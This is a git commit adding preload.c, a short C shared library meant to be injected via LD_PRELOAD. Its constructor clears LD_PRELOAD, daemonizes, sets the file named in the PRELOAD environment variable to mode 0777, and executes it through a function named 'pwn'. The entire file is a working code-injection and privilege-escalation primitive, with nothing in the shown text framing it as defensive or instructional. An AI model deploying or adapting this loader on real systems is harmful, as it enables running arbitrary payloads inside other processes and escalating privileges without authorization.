24145e354d1bd8a08ffe2c6508c5c66f75043124
Cvar1984 <Cvar1984@pm.me>
2022-08-03 15:36:19 +0700

    initial commit

---
+++ preload.c
@@ -0,0 +1,30 @@
+/**
+ * gcc preload.c -fPIC -shared -m{arch} -s -o preload.so
+ */
+#define  _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void pwn(void) {
+	chmod(getenv("PRELOAD"), 00777);
+        system(getenv("PRELOAD"));
+}
+
+void daemonize(void) {
+	signal(SIGHUP, SIG_IGN);
+	if (fork() != 0) {
+		exit(EXIT_SUCCESS);
+	}
+}
+
+__attribute__ ((__constructor__)) void preloadme(void) {
+  unsetenv("LD_PRELOAD");
+  daemonize();
+  pwn();
+}
+
